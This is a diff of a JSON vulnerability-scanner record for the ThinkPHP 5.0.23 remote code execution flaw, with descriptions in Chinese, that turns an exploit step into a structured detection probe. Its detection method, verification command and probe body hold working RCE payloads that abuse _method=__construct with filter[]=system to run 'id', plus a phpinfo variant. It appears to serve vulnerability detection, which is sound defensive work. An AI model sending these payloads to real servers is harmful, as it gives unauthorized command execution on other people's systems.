@@ -1,5 +1,6 @@
 {
   "vuln_id": "thinkphp_5023",
+  "dispatch_skill": "thinkphp_rce",
   "description": "ThinkPHP 5.0.23及之前版本中，获取method的方法未正确处理，允许攻击者调用Request类任意方法，导致远程代码执行漏洞。",
   "category": "expression_injection",
   "cves": [
@@ -25,13 +26,25 @@
     "/index.php?s=captcha"
   ],
   "detection_method": "发送POST请求到 /index.php?s=captcha，包含payload _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id，如果响应体包含命令执行结果（如uid=33(www-data)），则漏洞存在。",
-  "exploit_steps": [
+  "probes": [
     {
-      "step": 1,
-      "description": "发送恶意POST请求执行命令",
-      "command": "curl -d '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id' \"http://{TARGET}/index.php?s=captcha\"",
-      "expected_result": "响应体中返回命令执行结果，例如 uid=33(www-data)。",
-      "notes": "确保目标运行在默认端口8080，如果端口不同，需调整命令中的端口号。"
+      "id": "thinkphp_method_probe",
+      "description": "POST _method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1",
+      "method": "POST",
+      "path": "/index.php?s=captcha",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1",
+      "timeout": 10,
+      "success_signs": {
+        "body_contains_any": [
+          "phpinfo()",
+          "PHP Version",
+          "<title>phpinfo()"
+        ]
+      },
+      "confidence": 0.95
     }
   ],
   "verification_command": "curl -d '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id' \"http://{TARGET}/index.php?s=captcha\"",
